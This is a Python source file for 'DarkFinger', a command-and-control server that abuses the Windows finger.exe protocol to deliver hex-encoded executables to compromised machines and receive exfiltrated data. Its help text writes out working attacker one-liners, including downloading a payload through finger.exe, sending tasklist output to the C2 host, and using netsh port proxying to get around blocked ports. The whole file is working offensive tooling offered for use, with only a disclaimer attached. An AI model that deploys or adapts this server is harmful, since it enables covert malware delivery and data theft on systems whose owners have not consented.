import socket,sys,re,time,os,argparse

from shutil import copyfile
from subprocess import *
from subprocess import Popen, PIPE, STDOUT

#DarkFinger / Windows Finger TCPIP Command C2 Server (c)
#Downloader and Covert Data Tunneler
#By John Page (aka hyp3rlinx)
#ApparitionSec
#twitter.com/hyp3rlinx
#Modified by Arcueid
#https://github.com/Arcueld

#File Downloads must be Hex encoded text-files.
#Agents can change the port DarkFinger listens on dynamically:
#E.g. set to listen on port 80
#C:\>finger.exe !80!@DarkFinger-Server
#When not using Port 79, we need a Portproxy to send Port 79 traffic outbound to the specified Port.  
#Also, when using Ports other than Port 79 (default) we issue queries first to the machine running the Agent E.g.
#C:\>finger.exe <Command>@<Local-Machines-IP>
#
#Agents can change the Download wait time, to try an ensure files are fully downloaded before closing connections.
#Default time sent by the DF-Agent.bat PoC script is set to 10 seconds when issuing Download commands.
#Changing wait time before closing the socket when downloading PsExec64.exe E.g.
#C:\>finger.exe ps%<Wait-Time-Secs>%@%<DarkFinger-Server>%
#==============================================================================================================
#
port = 79                                    #Default if the client unable to Portproxy, use port 80/443 if possible.
downloads_dir = "Darkfinger_Downloads"       #Directory containing the Hex encoded files for download
byte_sz = 4096                               #Socket recv 
allowed_ports = [22,43,53,79,80,443]         #Restrict to a few.

BANNER="""
    ____             __   _______                      
   / __ \____ ______/ /__/ ____(_)___  ____ ____  _____
  / / / / __ `/ ___/ //_/ /_  / / __ \/ __ `/ _ \/ ___/
 / /_/ / /_/ / /  / ,< / __/ / / / / / /_/ /  __/ /    
/_____/\__,_/_/  /_/|_/_/   /_/_/ /_/\__, /\___/_/     
                                    /____/         v1
                                    
                           Finger TCPIP Command C2 Server
                                             By hyp3rlinx
                                             Modified By Arcueid
                                            ApparitionSec
"""


# 获取下载目录中的所有可用文件
def get_available_files():
    try:
        return {f[:-4]: os.path.join(downloads_dir, f) for f in os.listdir(downloads_dir) if f.endswith('.exe')}
    except Exception as e:
        print(f"[!] Error reading available files: {str(e)}")
        return {}

def create_files(file_conf):
    global downloads_dir
    if os.path.exists(file_conf):
        if os.stat(file_conf).st_size == 0:
            print("[!] Warn: Supplied conf file is empty, no downloads were specified!")
            exit()
    else:
        print("[!] Supplied conf file does not exist :(")
        exit()
    try:
        path = os.getcwd()
        if not os.path.exists(path + "\\" + downloads_dir):
            os.makedirs(downloads_dir)

        # 打开配置文件，逐行读取文件路径
        with open(file_conf, "r") as f:
            for x in f:
                x = x.strip()
                source_file = os.path.join(path, x)
                target_file = os.path.join(
                    path, downloads_dir, x.lower())  

                if os.path.exists(source_file):
                    try:
                        copyfile(source_file, target_file)
                        print(
                            f"[+] Created {x} as {x.lower()} in {downloads_dir} directory.")
                    except Exception as e:
                        print(
                            f"[!] Error copying {x} to {target_file}: {str(e)}")
                        exit()
                else:
                    print(
                        f"[!] Warn: File specified in the conf file to copy ({x}) does not exist!")
                    exit()

                time.sleep(0.5)  

    except Exception as e:
        print(f"[!] Error: {str(e)}")
    

def HexExec(t):
    try:
        with open(t, "rb") as f:
            payload = f.read().hex()  # 读取文件并转为十六进制字符串
        return payload
    except Exception as e:
        print(f"[!] Error reading file {t}: {str(e)}")
        return 9


def finga_that_box(cmd, victim):
    # 命令格式为 'filename:delay'，例如 'calc:10'
    cmd = cmd.rstrip()
    available_files = get_available_files()  # 获取所有可用文件
    print(available_files)

    # 如果命令中包含延迟的定义
    if ':' in cmd:
        filename, delay = cmd.split(':')
        delay = int(delay)  # 将延迟转为整数
    else:
        filename = cmd
        delay = 1  # 如果没有指定延迟，使用默认值 1 秒


    # 匹配文件名
    if filename in available_files:
        print(f"[+] Serving {filename}.exe")
        sys.stdout.flush()
        return available_files[filename], delay  # 返回对应文件路径和延迟时间

    if filename[:1] == ".":
        print(f"[+] Exfil from: {victim[0]} {filename[1:]}")
        sys.stdout.flush()

    return False, delay  # 返回延迟，即使没有文件传输



def fileppe_fingaz():
    global byte_sz, port, allowed_ports
    delay = 1
    s = socket.socket()
    host = ""
    try:
        if port in allowed_ports:
            s.bind((host, port))
            s.listen(5)
        else:
            print("[!] Port disallowed, you can add it to the 'allowed_ports' list.")
            exit()
    except Exception as e:
        print(str(e))
        exit()

    print("[/] Listening port:", str(port))
    sys.stdout.flush()


    try:
        while True:
            conn, addr = s.accept()
            a = conn.recv(byte_sz).decode()  # 接收命令

            try:
                # 处理端口改变的请求
                if a[:1] == "!":
                    idx = a.rfind("!")
                    if idx != -1:
                        port = str(a[1:idx])
                        if int(port) in allowed_ports:
                            port = int(port)
                            time.sleep(1)
                            conn.close()
                            s.close()
                            fileppe_fingaz()
                        else:
                            print(
                                f"[!] Disallowed port change request from: {addr[0]}")

            except Exception as e:
                print(str(e))
                pass

            # 调用 finga_that_box，解析文件名和延迟
            t, delay = finga_that_box(a, addr)  
            if t:
                exe = HexExec(t) 
                if exe == 9:
                    conn.close()
                    continue
                if exe:
                    try:
                        conn.sendall(exe.encode())  # 发送十六进制字符串
                        time.sleep(delay)  # 延迟
                        conn.close()
                        delay = 1  
                    except Exception as e:
                        print(f"[!] Error sending file: {str(e)}")
                        sys.stdout.flush()
            conn.close()
            delay = 1

    except Exception as e:
        print(str(e))
        pass
    finally:
        s.close()
        fileppe_fingaz()


def about():
    print("[+] Darkfinger is a basic C2 server that processes Windows TCPIP Finger Commands.")
    print(" ")
    print("[+] File download requests require the first two chars (lowercase) for the file we want,")
    print("[+] plus the wait time, this trys to ensure a full transmit before close the connection.")
    print("[+] Download calc.exe and wait 10-secs before closing the socket:")
    print("[+] finger.exe calc:10@DarkFinger | more +2 > calc.txt")
    print(" ")
    print("[+] Exfil Windows Tasklist using the '.' character used as the DarkFinger exfil flag:")
    print("[+] cmd /c for /f \"tokens=1\" %i in ('tasklist') do finger .%i@DarkFinger-Server")
    print("[+]")
    print("[+] If Port 79 is blocked, use Windows Netsh Portproxy to reach allowed internet Ports.")
    print("[+] Dynamically change the port Darkfinger C2 listens on to port 80:")
    print("[+] finger.exe !80!@DarkFinger-Server")
    print(" ")
    print("[+] DarkFinger-Agent.bat script is the client side component to demonstrate capabilities.")
    print("[+] Note: This is just a basic PoC with no type of real security whatsoever.")
    print("[+] Disclaimer: Author not responsible for any misuse and or damages by using this software.")


def main(args):

    global port
    print(BANNER)
        
 

    if args.about:
        about()
        exit()

    if args.port:
        port = int(args.port)
    else:
        port = 79 # 默认79端口

    if args.conf:
        create_files(args.conf)
    else:
        ## note 记得删除
        # create_files("finger.conf")

        print("[!] Warn: No Hex files created for download!, add required -c flag.")
        exit()
        
    fileppe_fingaz()


def parse_args():
    parser.add_argument("-p", "--port", help="C2 Server Port",  nargs="?")
    parser.add_argument("-c", "--conf", help="File path",  nargs="?")
    parser.add_argument("-a", "--about", nargs="?", const="1", help="Darkfinger information")

    return parser.parse_args()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    main(parse_args())